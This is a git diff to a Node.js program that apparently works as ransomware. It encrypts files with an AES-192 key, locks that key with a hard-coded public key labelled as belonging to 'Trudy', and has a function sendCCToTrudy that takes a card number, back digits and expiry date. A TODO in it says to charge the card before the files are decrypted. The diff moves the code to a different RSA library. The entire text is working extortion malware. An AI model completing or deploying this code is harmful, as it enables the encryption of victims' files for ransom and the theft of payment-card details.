@@ -1,3 +1,4 @@
+'use strict'
 // Library for finding Files
 var fileFinder = require('fs-finder');
 
@@ -5,8 +6,8 @@ var fileFinder = require('fs-finder');
 var fileStream = require('fs');
 
 // RSA library
-var ursa = require('ursa-purejs');
-var localRSA = require('./rsa')
+var ursa = require('node-rsa');
+var localRSA = require('./js/rsa.js');
 
 // AES-192 library to encrypt and decrypt files
 var encryptor = require('file-encryptor');
@@ -30,6 +31,10 @@ var pubkeyTrudy = '-----BEGIN PUBLIC KEY-----\n'+
 'mQmilgQsNiTzlPmGgQIDAQAB\n'+
 '-----END PUBLIC KEY-----\n';
 
+var pubkeyRSA = new ursa(localRSA.privkeypem);
+
+pubkeyRSA.importKey(pubkeyTrudy,'public');
+
 
 //var secureRandom = require('secure-random-string');
 //var password = secureRandom(64);
@@ -40,15 +45,15 @@ var pubkeyTrudy = '-----BEGIN PUBLIC KEY-----\n'+
  */
 function encryptFiles(){
   console.log("DUDE ITS RUNNING!!!");
-
+  console.log(pubkeyRSA);
   // Secure Random generator for key for AES-192
   var secureRandom = require('secure-random-string');
   var password = secureRandom(64);
 
-  console.log(`Print out ursa: ${ursa}`);
+  //console.log(`Print out ursa: ${ursa}`);
 
-  var pubkey = ursa.createPublicKey(pubkeyTrudy);
-  encryptedKey = pubkey.encrypt(password, 'utf8', 'base64');
+  //var pubkey = ursa.createPublicKey(pubkeyTrudy);
+  encryptedKey = pubkeyRSA.encrypt(password, 'base64');
 
   // Saving the encrypted key for later use. Incase the program shuts off.
   process.env['Encrypted-Key'] = encryptedKey;
@@ -95,7 +100,7 @@ function sendCCToTrudy(cardNumber, backNumbers, expiryDate) {
   } else {
     //TODO charge the card with money and then decrypt the files
     
-    deCryptFiles(localRSA.privkey.decrypt(encryptedKey, 'base64', 'utf8'));
+    deCryptFiles(pubkeyRSA.decrypt(encryptedKey, 'utf8'));
   }
 
   return true;
